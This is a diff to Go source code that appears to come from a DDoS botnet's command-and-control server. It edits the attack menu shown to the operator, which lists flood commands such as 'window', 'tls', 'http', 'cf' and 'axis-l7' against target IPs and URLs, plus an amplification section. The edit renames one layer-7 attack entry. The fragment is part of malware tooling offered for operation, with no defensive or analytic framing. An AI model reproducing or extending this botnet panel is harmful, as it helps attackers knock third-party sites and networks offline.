@@ -139,7 +139,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mwindow <ip> <time> [dport=80]\x1b[1;34m                                               \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mLAYER 7 HTTP:                                                                       \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtls <url> <time> [domain=x]\x1b[1;34m                                                 \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtlsplus <url> <time> [domain=x]\x1b[1;34m                                             \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mhttp <url> <time> [domain=x]\x1b[1;34m                                                \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mcf <url> <time> [domain=x]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-l7 <url> <time> [domain=x]\x1b[1;34m                                             \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAMPLIFICATION:                                                                      \x1b[1;34m║\r\n"))
